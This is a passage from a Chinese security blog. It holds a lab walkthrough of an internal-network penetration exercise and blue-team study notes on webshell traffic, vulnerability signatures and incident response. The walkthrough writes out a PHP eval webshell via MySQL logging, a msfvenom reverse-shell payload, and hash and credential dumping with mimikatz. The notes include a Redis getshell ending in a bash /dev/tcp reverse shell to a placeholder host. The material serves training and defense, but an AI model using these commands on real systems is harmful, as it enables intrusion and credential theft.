[{"title":"红日内网靶场 1","path":"/2025/03/30/靶场/红日内网渗透/ATT&CK(1)/","content":"红队系列 0x01 环境配置https://blog.csdn.net/jnszstmei/article/details/143832390 配置好的拓扑图，win7 作为服务器，Windows Server 2003 作为域成员主机，Windows Server 2008作为域控 0x02 拿下服务器因为我们现在重心在内网，所以外网服务器迅速过一下，访问一下发现是 yxcms 的站点 我们可以百度打一下 yxcms 的 nday，这里dirsearch 扫一下服务器 登录 phpmyadmin 后台，发现弱口令:root&#x2F;root 搜一下 phpmyadmin 后台 getshell secure_file_priv为NULL，表示限制mysql不允许导入导出。 这里我们利用日志文件Getshell。phpmyadmin利用日志文件Getshell 执行以下命令 123set global general_log=on; #开启日志set global general_log_file=&#x27;C:/phpstudy/www/yxcms/hack.php&#x27;; #设置指定文件为网站 日志存放文件SELECT &#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27; #执行该语句，会将该命令写入日志文 件中 成功拿下服务器 0x03 内网后渗透先看一下有什么信息 12whoami=&gt; god\\administrator 我们知道当前的用户身份是 administrator ，在管理员组中，并且处在域 god 中 1ipconfig 执行后发现该主机有两张网卡，分别是 192.168.207.129， 192.168.52.143 12345678910111213net localgroup administratorsnet localgroup获取和配置本地组或域组 这里查看一下本地管理员=&gt; 别名 administrators注释 管理员对计算机/域有不受限制的完全访问权成员-------------------------------------------------------------------------------AdministratorGOD\\Domain Adminsliukaifeng01命令成功完成。 由此可知，其实获得的这个权限就是域管理员权限。 接下来我们运行msf，使用msf上线主机，如下所示 1msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.207.1 LPORT=9000 -f exe -o shell.exe 192.168.207.1 是我们的攻击机，我们将shell.exe通过蚁剑上传到靶机上去 接着我们在攻击机上开启监听模式，持续监听连接 1234567msfconsoleuse exploit/multi/handlerset payload windows/x64/meterpreter/reverse_tcpset lhost 192.168.207.1set lport 9000optionsrun 我们用蚁剑运行exe文件，如下所示。 我们的攻击机成功上线windows7，进来后第一步肯定是提权到 system：这里直接是 administrator，所有可以直接 getsystem 提到 system，实战中还需要其他手段提权。 获取账号密码： 导入账号，密码hash值： 1234meterpreter &gt; hashdumpAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::liukaifeng01:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 123456789101112Windows系统下的hash密码格式为：用户名称:RID:LM-HASH值:NT-HASH值NT-HASH hash生产方式： 1. 将明文口令转换成十六进制的格式 2. 转换成Unicode格式，即在每个字节之后添加0x00 3. 对Unicode字符串作MD4加密，生成32位的十六进制数字串eg：用户密码为test123转换成十六进制的格式为74657374313233转换成Unicode格式为7400650073007400310032003300对字符串7400650073007400310032003300作MD4加密，结果为c5a237b7e9d8e708d8436b6148a25fa1 导出hash 1run windows/gather/smart_hashdump 加载kiwi模块 这里尝试加载kiwi模块，获取不到账号密码（后来才知道mimikatz已经和并进kiwi了） 12load kiwicreds_all 加载 mimikatz 模块 加载 mimikatz 模块，加载模块前需要先将meterpreter迁移到64位的进程，该进程也需要是system权限，这一步也叫进行权限维持，就是要将进程进行迁移，即将我们的shell.exe的进程附加在系统进程上。 1ps 1migrate 388 kiwi 已经 和 mimikatz 合并 1creds_all 密码就出来了 所以完整获取密码的步骤应该是启动 kiwi 就行了 1234load kiwipsmigrate 388creds_all 远程桌面登录 这里我们已经获得了administrator的账号和密码，现在我们既可以使用administrator账号登录，也可 以新建账号登录(hack&#x2F;Password@)。(不建议直接用administrator身份登录，因为这样有可能会惊动管 理员) 通过nmap扫描发现该主机的3389端口呈过滤状态，由此猜想可能是防火墙将该端口过滤了 于是执行以下命令开启3389端口 1run post/windows/manage/enable_rdp 尝试3389远程登录该主机，但是弹出如果我们继续登录，则会断开该主机的当前连接。为了不惊动管理 员，这里我们不继续连接了。 收集域内信息 内网信息收集的主要目的就是查找域控以及域控内的其他主机 123456789101112net view # 查看局域网内其他主机名net config Workstation # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域net user # 查看本机用户列表net user /domain # 查看域用户net localgroup administrators # 查看本地管理员组（通常会有域用户）net view /domain # 查看有几个域net user 用户名 /domain # 获取指定域用户的信息net group /domain # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）net group 组名 /domain # 查看域中某工作组net group &quot;domain admins&quot; /domain # 查看域管理员的名字net group &quot;domain computers&quot; /domain # 查看域中的其他主机名net group &quot;doamin controllers&quot; /domain # 查看域控制器主机名（可能有多台） 首先判断是否存在域，我们使用ipconfig /all查看DNS服务器，我们发现存在域god.org 接着我们使用net view /domain查看有几个域 我们发现只有唯一一个域，接下来我们查看 域中所有域控制器，我们使用net group &quot;Domain Controllers&quot; /domain进行查询即可，我们可以查询到域控为owa 我们接着查询所有域内主机，如下所示net view 接着我们查询域内IP，使用arp -a进行查询 为了确定哪个是域控主机IP，我们尝试去ping一下域名ping owa.god.org 至此我们域内信息收集完毕 12345域名为 god域中有三台主机：stu1.god.org root-tvi862ubeh.god.org 192.168.52.141owa.god.org 192.168.52.138 域控主机 派生CobaltStrike权限首先在CobaltStrike上开启一个监听","tags":["内网"],"categories":["内网"]},{"title":"hvv知识点","path":"/2025/03/26/work/护网总结/","content":"Webshell工具流量特征？冰蝎（Behinder）3.0通过流量分析，该版本所有的流量特征中请求的开头都是yc8MNtAHgYXhSjykK5u2E 冰蝎（Behinder）4.0通过流量分析，该版本所有的流量特征中请求的开头都是yc8MNtAHgYXhSjykK5u2E 请求特征： Header：必含 **Cookie: PHPSESSID&#x3D;…**（PHP 版本）或动态密钥头（如 X-Auth-Key）。 并不是每个数据包都存在以下特征，这个特征是命令执行时的特征 编码格式 post流量特征 解密后内容 xor_base64 dFAXQV1LORcHRQtLRlwMAhwFTAg&#x2F;M @error_reporting(0);………. aes m7nCS8n4OZG9akdDlxm6O @error_reporting(0);………. aes_with_magic m7nCS8n4OZG9akdDlxm6O @error_reporting(0);………. xor 没连接成功 没连接成功 哥斯拉（Godzilla）1.6请求特征： Header：Content-Type: application&#x2F;octet-stream 或自定义 MIME 类型。在请求包的Cookie中有一个非常致命的特征，最后的分号。 Body：XOR 加密 + 自定义填充，首字节为密钥长度标识（如 0x10 表示 16 字节密钥）。 URL：路径伪装为静态资源（如 &#x2F;images&#x2F;logo.png），参数名随机但格式为 _&#x3D;timestamp。 响应特征： 返回数据含 key 字段用于动态密钥交换，解密后包含 godzilla 关键字。 蚁剑（AntSword）2.8请求特征： Body：Base64 嵌套异或加密，常见 @ini_set 等 PHP 函数名，每个请求实体都存在@ini_set(“display_errors”, “0”);@set_time_limit(0)开头。并且后面存在base64等字符 流量包由多个参数构成。其中一个参数为连接密码。后面的参数为随机生成的，如果蚁剑的请求中包含了多个参数，那个该参数的值为前两位混淆字符，需要删除前两位才能进行base64解码。 响应特征： 返回数据为 Base64 编码，解密后含 antsuccess 或 antoutput 标识。 菜刀（ChinaChopper）2023 魔改版请求特征： Header：Accept: text&#x2F;html, image&#x2F;gif, image&#x2F;jpeg, *; q&#x3D;.2, *&#x2F;*; q&#x3D;.2（经典特征）。 Body：eval(base64_decode($_POST[‘z0’])) 结构，参数名固定（如 z0, z1）。 URL：路径简短（如 &#x2F;admin.php），参数值长度固定为 16 倍数。 响应特征： 返回明文 OK 或加密后的 %00 填充数据。 MSF payload为windows&#x2F;shell&#x2F;reverse_tcp时，响应为明文。 payload为windows&#x2F;meterpreter&#x2F;reverse_tcp时，流量包中会有MZ和DOS模式异常字符。 默认监听端口为4444，远程连接端口为大端口 CS 心跳包 60s 50050端口 强特征，在流量中，通过http协议的url路径，经过checksum8解密算法计算后，32位的后门得到的结果是92，而64位的后门得到的结果是93 特征总结： 工具 核心标识 检测难度 冰蝎 内置多个UA头，请求的开头都是yc8MNtAHgYXhSjykK5u2E，会携带Accept字段，请求体解密后 @error_reporting(0);…。请求的refer头实际不存在，端口较大，使用本地端口在49700左右，每连接一次，每建立一次新的连接，端口就依次增加 ★★★★☆ 哥斯拉 三次请求包，第二次第三次Cookie最后有分号，参数就是 password ★★★☆☆ 蚁剑 Base64 嵌套异或 + @ini_set(“display_errors”, “0”) 关键字 ★★☆☆☆ 菜刀 eval(base64_decode) + 固定参数名 ★☆☆☆☆ 判断是不是一个 webshell 上传了非业务的脚本文件 上传的代码文件存在混淆 存在加解密函数 微步等沙箱上传判断 漏洞流量特征log4j2 流量特征Log4j2 是 Apache 软件基金会开发的一个日志框架，广泛用于 Java 应用中记录运行时日志。漏洞主要源于 Log4j2 的日志处理功能中，某些特性（如 JNDI 注入）被攻击者滥用，从而引发严重的远程代码执行（RCE）漏洞。 Apache Log4j2 的 JNDI https://xz.aliyun.com/news/11723?time__1311=eqUxuQDtGQi%3DD%3DD7bD%2F%2BnRuDjo%3DQ%3DDgnijhoD&amp;u_atoken=bf98110b6383762a98ab8b538b0fd69c&amp;u_asig=ac11000117436813596651822e004aLookup 功能允许通过日志消息中的 JNDI 名称引用外部资源。攻击者可以构造包含恶意 JNDI 名称的日志消息，通过网络发送给受影响的应用程序。当 Log4j2 解析日志消息时，会尝试加载远程恶意脚本，从而RCE漏洞产生 JNDI 注入 JNDI（Java Naming and Directory Interface） 是 Java 提供的一种目录服务 API，用于查找和加载资源或对象。 Log4j2 在日志功能中支持动态解析类似 ${} 的占位符字符串，提供了强大的灵活性。 当日志字符串中包含 ${jndi:ldap:&#x2F;&#x2F;malicious-server} 时，Log4j2 会尝试通过 JNDI 去远程加载资源。如果目标是攻击者控制的恶意 LDAP 服务器，则攻击者可以返回恶意的 Java 类字节码，导致远程代码执行。 该漏洞主要是由于日志在打印时当遇到$&#123;后，以:号作为分割，将表达式内容分割成两部分，前面一部分prefix，后面部分作为key，然后通过prefix去找对应的lookup，通过对应的lookup实例调用lookup方法，最后将key作为参数带入执行，引发远程代码执行漏洞 强特征： 攻击者发送的数据包中可能存在${jndi:}字样 jndi注入,可以不是jndi,jndi有可能被拼接,但是一定有${},一般通过ldap远程加载class文件 有时会出现在ua头,不在请求体 检查网络流量和日志记录，检查IDS（入侵检测系统） 检查DNS，有没有指向一个危险域名 漏洞修复 升级 Log4j2 版本： 禁用 JNDI 功能： 移除 JndiLookup 类： 升级依赖软件： tomcat8080 任意文件上传，远程代码执行、war后门文件部署 JBoss 反序列化漏洞、war后门文件部署 IISPUT漏洞、短文件名猜解、远程代码执行、解析漏洞 IIS6 C:\\Windows\\System32\\LogFiles IIS7 C:\\inetpub\\logs\\LogFiles Apache解析漏洞、目录遍历 Nginx 文件解析、目录遍历、CRLF注入、目录穿越 错误日志为error.log，访问日志一般带有access.log WebLogic T3反序列化Oracle WebLogic Server 是一个统一的可扩展平台，专用于开发、部署和运行 Java 应用等适用于本地环境和云环境的企业应用。它提供了一种强健、成熟和可扩展的 Java Enterprise Edition (EE) 和 Jakarta EE 实施方式。类似于Tomcat、Jboss等。 在weblogic中反序列化漏洞主要分为两种，一种是基于T3协议的反序列化漏洞，还一种是基于XML的反序列化漏洞 反序列化漏洞SSRF任意文件上传war后门文件部署 ssrf漏洞特征 会出现特征关键词 t3，rmi，ldap 提取的规则字段为：http_client_body ，提取的时候，这个关键字可以用hex来提取。 ShiroShiro 默认使用了 CookieRememberMeManager，其处理 cookie 的流程是：得到 rememberMe 的 cookie 值–&gt;Base64 解码–&gt;AES 解密–&gt; 反序列化。然而 AES 的密钥是硬编码的，密钥泄漏的根本原因是开发人员在开发过程中部分代码直接使用了网上的一些开源的项目代码，就导致了攻击者可以构造恶意数据造成反序列化的 RCE 漏洞。 CVE-2016-4437的攻击流量特征有 请求包Cookie的rememberMe中会存在AES+base64加密的一串java反序列化代码。 返回包中存在base64加密数据，该数据可作为攻击成功的判定条件。 命令执行后返回包有多个 $ 符号 传不死马返回包有 success ，请求包有个p字段，字段值就是连接密码 爆破密钥失败的话返回包的 cookie 字段rememberMe&#x3D;deleteme，爆破成功的话返回包没有 rememberMe 字段 a. shiro550:登陆成功后cookie中的rememberMe字段是经过序列化、aes加密、base64编码处理的，服务端获取它并进行反方向处理，而低版本的aes的密钥是硬编码可以在代码中找到，攻击者伪造恶意的序列化对象作为cookie发送，服务端进行处理时可以造成反序列化漏洞。我们使用exp伪造cookie可以进行命令执行。 （不需要已知remberme字段值） b. shiro721:登录成功后cookie中的rememberMe字段是经过序列化、AES-128-CBC加密处理的，这里的aes的密钥是随机生成的，但是我们可以通过Padding Oracle加密生成的攻击代码构造恶意的rememberMe字段（原始的rememberMe作为前缀加载ysoserial生成的payload进行攻击），服务端在处理时产生反序列化漏洞，进而可以进行命令执行等。（需要已知remberme，也就是要登录成功） redis攻击者在未授权访问 Redis 的情况下，可以利用 Redis 自身的提供的 config 命令像目标主机写WebShell、写SSH公钥、创建计划任务反弹Shell等。其思路都是一样的，就是先将Redis的本地数据库存放目录设置为web目录、~&#x2F;.ssh目录或&#x2F;var&#x2F;spool&#x2F;cron目录等，然后将dbfilename（本地数据库文件名）设置为文件名你想要写入的文件名称，最后再执行save或bgsave保存，则我们就指定的目录里写入指定的文件了。 6379 1231、对方redis远程连接开启2、对方redis未设置密码或者密码泄露 绝对路径写webshell —有无认证均可123456789redis-cli -h 192.168.3.134 #连接Redis config set dir /www/admin/localhost_80/wwwroot #设置要写入shell的路径set xxx “ &lt;?php phpinfo() ;?&gt; ” #写入phpinfo()到xxx键config set dbfilename phpinfo.phpsave redis主从复制getshell12345config set dir /tmp/ //设置文件路径为/tmp/config set dbfilename exp.so //设置数据库文件名为：exp.soslaveof vpsip port //设置主redis地址为 vpsip，端口为 portmodule load /tmp/exp.sosystem.exec &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27; SSRF打redis gopherus直接打redis dict协议打redis fastjsonfastjson 在解析 json 的过程中，支持使用 autoType（自动识别类型） 这个功能来读取 @type 的内容，并根据 @type 的内容来实例化某一个具体的类。这个过程中允许 JSON 数据直接控制 Java 的类加载器行为，从而创建任何类型的对象,通过这个过程只需要构造一个恶意利用链的方式达到命令执行的目的 使用了伪协议，反序列化 a. 首先我们来看一下ChatGPT对常见的几种伪协议的解释： ⅰ. JNDI伪协议：将一个Java对象绑定到一个JNDI上下文中，攻击者 可以通过构造恶意的JSON字符串绑定一个恶意对象到JNDI上下文中，从而在反序列化时进行远程代码。 ⅱ. Idap伪协议：将一个Java对象绑定在Idap目录中，攻击者可以通过构造恶意的JSON字符串，绑定一个恶意对象到LDAP目录中，从而执行反序列化代码。 ⅲ. Rmi伪协议：该协议通过远程调用Java Rmi服务，攻击者 可以通过 构造Json字符串，调用一个恶意的RMI服务，从而在反序列化中执行远程代码。 b. 上述三种协议了解即可，fastjson使用了Rmi和Idap协议 c. 调用的是JSON.parseObject(json,User.class)函数 请求报文中查找json格式的数据，重点看有无rmi或者出网的一些行为 数据包体里面会有@type，标注了类对应的原始类型，方便在反序列化的时候定位到具体类型 查看网站源代码搜索关键词。 开发者工具，查看请求代码是否存在”com.alibaba.fastjson或者fastjson Struts2恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。 流量特征 poyload存放在请求头的content-type中，正常content-type是代表的类型 content-type会显得非常长、会有一些java命令 有回显的 应急响应 应急响应模型 准备阶段 应急团队建设 应急方案制定 渗透测试评估 安全基线检查 检测阶段 判断事件类型 判断事件级别 确定应急方案 抑制阶段 阻断：ip地址，危险主机 关闭：可疑进程，服务 删除：违规账号，木马 根除阶段 增强策略，监控 修复漏洞 还原操作系统，业务系统 恢复阶段 恢复业务，用户，网络数据 总结阶段 事件总结，报告输出，应急优化 流程 收集信息：收集客户信息和中毒主机信息，包括样本 判断类型：判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DoS 等等 抑制范围：隔离使受害面不继续扩大（做好隔离） 深入分析：日志分析、进程分析、启动项分析、样本分析方便后期溯源 清理处置：杀掉进程，删除文件，打补丁，删除异常系统服务，清除后门账号防止事件扩大，处理完毕后恢复生产 产出报告：整理并输出完整的安全事件报告 eg：windows服务器入侵排查实战 入侵行为：被挂黑页 先恢复网站，删除木马。 再做排查 账号排查 正常用户 net user 能看到（Windows&#x2F;system32&#x2F;config下的sam文件有用户密码） 隐藏用户net命令看不到，但是在控制面板、lusrmgr.msc、用户组中能看到，用户名特征是结尾有 $ 符号 影子用户只有注册表中能看到 日志排查 日志查看：windows可以通过自带的事件查看器去管理事件，eventvwr.msc(Win10以上直接搜索事件查看)，这些窗口里的东西保存在Winodws\\System32\\Configure——–windows2000&#x2F;xp，Windows\\System32\\winvert\\Logs—-windows7以上，熟悉日志路径：*.evtx。我们要定期备份日志安全ID:SYSTEM，在信息里查看服务，木马会生成服务，我们自己配置过木马。看东西进行筛选可以通过事件ID进行筛选 RDP远程登陆： 黑客如果通过远程去登陆计算机、那么黑客的电脑和我的电脑都会产生相应的事件 1234567894624-登陆成功4648-明文尝试登陆4778-重新连接4779-断开连接1149-用户验证成功 黑客要知道用户名和密码去实现远程桌面登陆，我们可以在日志中看到黑客是在什么时候登陆的 简述： 日志查看、信息里查看服务、排查时间ID进行筛选 网络排查 netstat -ano netstat -anob 丢进蓝队工具箱提取ip &#x3D;&gt; 威胁情报查看是否是恶意ip &#x3D;&gt; 根据恶意ip去下一步排查进程 pid 进程排查 获取进程pid（任务管理器） 注册表排查 查用户自启动项 镜像劫持 系统相关信息排查 计划任务 服务 可疑文件 修复漏洞 **eg2:**Linux 应急响应 系统信息收集 版本内核 cat &#x2F;etc&#x2F;os-release ,uname -a 用户信息 &#x2F;etc&#x2F;passwd （无用户密码） 影子文件 &#x2F;etc&#x2F;shadow (有用户密码) 重点查看目录 &#x2F;tmp,&#x2F;var&#x2F;tmp,&#x2F;root,&#x2F;home 异常端口 netstat 异常进程 ps aux ｜ grep id 启动项文件 入侵排查 查询特权用户（uid&#x3D;0） 查询可以远程登录的账号信息 看看除root外有没有其他账号存在 sudo 权限，有的话删掉 禁用或者删除可疑账号 查看历史命令 history,.bash_history 查看日志 日志默认存放位置：&#x2F;var&#x2F;log&#x2F; 查看日志配置情况：more &#x2F;etc&#x2F;rsyslog.conf 日志文件 说明 &#x2F;var&#x2F;log&#x2F;cron 记录了系统定时任务相关的日志 &#x2F;var&#x2F;log&#x2F;cups 记录打印信息的日志 &#x2F;var&#x2F;log&#x2F;dmesg 记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息 &#x2F;var&#x2F;log&#x2F;mailog 记录邮件信息 &#x2F;var&#x2F;log&#x2F;message 记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件 &#x2F;var&#x2F;log&#x2F;btmp 记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看 &#x2F;var&#x2F;log&#x2F;lastlog 记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看 &#x2F;var&#x2F;log&#x2F;wtmp 永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看 &#x2F;var&#x2F;log&#x2F;utmp 记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询 &#x2F;var&#x2F;log&#x2F;secure 记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中 总结 Linux 审查常见中间件的日志，如apache、nginx、redis、mysql等 审查开机启动和登录启动配置文件 审查所有用户的命令历史记录 审查用户信息文件和影子文件 审查定时任务 熟练使用常见的运维面板，如宝塔面板、1Panel等 熟练使用Linux三剑客过滤webshell、flag、IP等关键字 审查数据库中的用户表，查找篡改用户 Windows 全盘搜索可疑文件，批处理文件、可执行文件、office文件、压缩文件等 检查粘滞键(敲击5次shift键)是否被替换 使用WindowsLog_Check或者Log Parser分析系统登录日志，查找可疑IP地址、可疑用户名 进程管理器检查系统占用率、可疑进程 资源管理器开启显示隐藏文件，查找可疑文件 netstat -ano查看已建立的连接，查找可疑端口 从注册表中查找隐藏用户，并在隐藏用户的家目录下查找可疑文件 使用火绒剑辅助检查启动项、计划任务、服务、网络连接 使用D盾、河马等工具检测网站源码是否存在后门，或者使用dnGREP搜索webshell的关键字 使用遥知辅助分析nginx和apache日志，过滤频繁出现的IP地址、可疑请求 审查网站数据库，尤其和用户相关的表，查找可疑字段 工具ProcessHacker 功能：ProcessHacker 是一款不错的进程分析工具，可查看所有进程信息，包括进程加载的 dll、进程打开的文件、进程读写的注册表……，也可以将特定进程的内存空间 Dump 到本地，此外还可以查看网络连接。 ProcessExplorer 功能：ProcessExplorer 是一款不错的进程分析工具，微软官方推荐工具，稳定性和兼容性相对不错。可查看所有进程的信息，包括其加载的 dll、创建的线程、网络连接……，同样可以 Dump 出进程的内存空间到本地。 ProcessMonitor 功能：ProcessMonitor 是一款实时刷新的进程信息监控工具，微软官方推荐工具，稳定性和兼容性也是相对出色。展示的信息很全面，且每一个打开的句柄、注册表、网络连接…… 都与具体的进程关联起来。 PCHunter 功能：XueTr 的增强版，功能和 XueTr 差不多，可参考上图。推荐更多使用 PCHunter，减少出故障的概率。 Wireshark 功能：Wireshark 是一款常用的网络抓包工具，同时也可以用于流量分析。 AutoRuns 功能：一款不错的启动项分析工具，微软官方推荐。只要涉及到启动项相关的信息，事无巨细，通通都可以查询得到，非常方便找到病毒的启动项。 FastIR 功能：收集操作系统的关键日志、关键信息，方便后续取证和排查分析。 Hash 功能：文件 hash 计算工具，可计算文件 MD5、SHA1、CRC 值，可用于辅助判断文件是否被篡改，或者使用哈希值到威胁情报网站查看是否为恶意文件。 如何检测 Java 内存马内存马排查思路 先查看检查服务器web日志，查看是否有可疑的web访问日志，比如说filter或者listener类型的内存马，会有大量url请求路径相同参数不同的，或者页面不存在但是返回200的请求。 如在web日志中并未发现异常，可以排查是否为中间件漏洞导致代码执行注入内存马，排查中间件的error.log日志查看是否有可疑的报错，根据注入时间和方法根据业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞。 查看是否有类似哥斯拉、冰蝎特征的url请求，哥斯拉和冰蝎的内存马注入流量特征与普通webshell的流量特征基本吻合。 通过查找返回200的url路径对比web目录下是否真实存在文件，如不存在大概率为内存马。 简述： 首先排查web日志文件，日志中没有排查中间件漏洞导致的，排查中间件的error.log日志，查看是否又哥斯拉和冰蝎流量特征，查看返回200的url路径是否在web下真实存在，不存在大概率是内存马。 内存马特征的识别通过分析网络流量，可以识别出潜在的内存马活动。以下是一些常见的可疑流量特征： 异常请求路径和状态码 GET 请求： 访问不存在的路径，但返回 404 状态码，同时携带可疑参数，例如 &#x2F;memshell?cmd&#x3D;calc，其中 &#x2F;memshell 路由并不存在，但请求却可能被执行。 POST 请求： 访问正常路径，返回 200 状态码，但请求体中包含恶意命令，且命令被成功执行。示例： 攻击者可能会尝试通过访问 &#x2F;shell, &#x2F;cmd, &#x2F;hack, &#x2F;test 等不存在的路径，并携带参数执行命令。动态变化的数据包大小： 内存马在执行命令或返回结果时，会导致数据包大小发生动态变化，这是内存马活动的典型特征。 特殊的 User-Agent 或 Referer 字段： 攻击者有时会使用特殊的 User-Agent 或 Referer 字段来标识或控制内存马。 异常的响应时间： 内存马执行命令可能导致响应时间变长或不稳定。 代码特征分析 通过分析 Web 应用的 Class 文件、Jar 包以及运行时内存数据，可以发现潜在的内存马代码。以下是一些常见的可疑代码特征： 连接密码： 内存马通常会设置连接密码，用于远程控制和执行命令。例如，代码中可能存在 password, key, token 等字符串，用于身份验证。 自定义路由： 内存马会注册自定义的路由，用于接收攻击者的指令。例如，代码中可能存在 @WebServlet, @RequestMapping 等注解，用于映射 URL 到恶意代码。 加解密操作： 为了隐藏恶意代码和通信内容，内存马通常会使用加解密算法，例如 AES、Base64 等。代码中可能存在 javax.crypto, java.util.Base64 等相关的类和方法。 恶意的代码执行： 内存马的核心功能是执行恶意命令。代码中可能存在 Runtime.getRuntime().exec(), ProcessBuilder 等方法，用于执行系统命令。 动态注册组件： 内存马可能会利用 Java 反射机制动态注册 Filter、Servlet、Listener 等组件，例如 ClassLoader.defineClass(), Class.forName() 等方法。 可疑的类名和包名： 内存马的类名和包名通常会伪装成正常的类，但可能包含一些可疑的关键词，例如 shell, cmd, hack, util 等。 查杀基于 Java Agent 技术的内存马查杀 前面已经提到了java agent可以动态的修改字节码用来动态注册内存马，当然也可以用该技术处理内存马。 工具一：通过 JSP 脚本扫描 Java Web Filter&#x2F;Servlet&#x2F;Listener 类型内存马 工具地址： 通过jsp脚本扫描java web Filter&#x2F;Servlet&#x2F;Listner类型内存马 原理： 该工具通过 JSP 脚本实现，利用反射机制遍历 Tomcat 容器中的 Filter、Servlet 和 Listener，并检查它们的 ClassLoader 是否与正常的 ClassLoader 一致。如果 ClassLoader 不一致，则可能存在内存马。 使用方法： 下载项目中的 tomcat-memshell-scanner.jsp 文件。 将 tomcat-memshell-scanner.jsp 文件上传到目标 Tomcat 服务器的 Web 应用目录下。 通过浏览器访问 tomcat-memshell-scanner.jsp 文件，例如：http://127.0.0.1:8088/FilterShell_war_exploded/tomcat-memshell-scanner.jsp。 重启服务器 哥斯拉注入的是 servelet 注入到路由里，删除路由即可（tomcat-memshell-scanner.jsp 扫描网站） 冰蝎注入的是 agent，删除class即可（arthas retransform 重新加载jvm里的类，可以用lib下的jar包里的，也可以直接删除） arthas 主要命令 sc - 查看 JVM 已加载的类信息 jad - 反编译指定已加载类的源码 retransform - 加载外部的.class文件，retransform jvm 已加载的类 12345classloadersc *.Filtersc *.Servletjadheapdump 溯源溯源反制思路a. 流量溯源思路:可利用流量工具进行溯源： ⅰ. 1、查看 eval、z0、shell、whoami 等关键字，查看出现次数过多的时候，可能 需要查看是哪个 页面发起的请求，有可能是 webshell ⅱ. 2、通过 WireShark 工具快速搜索关键字，定位到异常流量包 ⅲ. 3、找出异常 IP 和所上传的内容，查看是否为 webshellb. 身份溯源思路： ⅰ. 旁站查询 ⅱ. 网络id带入QQ群查询 溯源思路 溯源的第一步通过域名ip反查目标的个人信息，一般通过微步社区或者奇安信威胁情报中心可以查询，通过域名可以查询whois注册信息，或许可以获得一些邮件等一些信息。通过站长之家查询下属域名。如果能查到一些攻击者相关ID可以通过社交账号进行搜索。攻击者如果上传了攻击程序，通过恶意程序分析网站比如微步在线云沙箱，腾讯哈勃等来进行分析。 流量溯源分析思路可利用流量工具进行溯源： 1、查看 eval、z0、shell、whoami 等关键字，查看出现次数过多的时候，可能 需要查看是哪个 页面发起的请求，有可能是 webshell 2、通过 WireShark 工具快速搜索关键字，定位到异常流量包 3、找出异常 IP 和所上传的内容，查看是否为 webshell 3 如何定位到攻击IP1、首先通过选择 - 统计 - 对话查看流量的走向情况，定位可疑的 IP 地址 2、根据定位到的 IP 地址，尝试对上传的 webshell 进行定位 ip.addr &#x3D;&#x3D;ip &amp;&amp;http matches “uploadleval|select|xp_cmdshell”&amp;&amp; http.request.method &#x3D;&#x3D; “POST” 3、查找到 Webshell 后尝试溯源漏洞位置，http.request.uri contains“webshell.php”，定位到最 开始 webshell 执行或上传的时候 4、根据最开始的 HTTP 上传包或者其他漏洞特产定位漏洞类 5、针对服务器中的日志，利用正则来发现一些危险操作的IP 6、使用wireshake进行流量分析，找到一些危险操作的IP 7、使用蜜罐进行一些诱导操作 8、找到webshell进行溯源，定位到webshell的上传服务器 9、一些钓鱼邮件没有伪装好，会暴露自身的IP地址 10、有些时候服务器中被上传了一些工具，可以根据一些工具（可能是对方自写）来进行搜集信息，比如去github看看。 11、社工库等。。。。 4 溯源常用的工具1、Rootkit 查杀：http://www.chkrootkit.org 2、Clamav 查杀：http://www.clamav.net/download.html ​\tClam AntiVirus是一个Linux系统上使用的反病毒软件包。 ​\t主要应用于邮件服务器，采用多线程后台操作，可以自动升级病毒库。\tyum安装 3、河马 webshell 查杀：http://www.shellpub.com 深信服 Webshell 网站后门检测工具：http://edr.sangfor.com.cn/backdoor_detection.html 内网横向渗透命令执行手段我们可以通过ipc链接来进行一个横向渗透建立 ipc$ 连接的条件： 目标主机开启了139和445端口 目标主机管理员开启了ipc$默认共享 这里我们已知用户名和密码，我们掌握了一台主机，现在通过这台主机链接它域内的另一台 net use \\目标主机IP\\ipc$ “密码” &#x2F;user:”administrator” 黄金票据和白银票据黄金票据Kerberos黄金票据是指攻击者通过攻击目标主机的 Kerberos 服务，获取了有效 TGT (Ticket-Granting Ticket) 的凭证，从而能够有效绕过其他系统控制机制而直接访问目标系统的所有资源。攻击者通常会在目标主机上运行恶意软件或使用其他恶意攻击手段，通过收集系统中存在的凭证或使用暴力破解等方式获取有效 TGT 凭证。 制作金票的条件： 1、域名称 2、域的SID值 3、域的KRBTGT账户密码HASH 4、伪造用户名，可以是任意的 白银票据白银票据指的是攻击者通过获取受害者系统中的普通凭证，然后利用这些凭证将自己伪装成普通用户并以用户权限运行，从而获取受害者系统中一部分敏感资源或特权操作的方式。与黄金票据不同，白银票据无法直接绕过系统保护机制或获取超级管理员权限，但利用这种票据，攻击者仍然可能对目标系统造成损害。 比如mimikaz这类可以窃取普通凭证 常用安全事件 ID 分类汇总 1. 系统事件（System Events） 事件ID 说明 1074 记录系统关机、重启或计划任务触发的关机操作，包含原因和发起者。 6005 事件日志服务启动，表示系统正常启动。 6006 事件日志服务停止，表示系统正常关机。 104 日志被清除（需警惕攻击者清除痕迹）。 7036 服务状态变更（如服务启动&#x2F;停止）。 2. 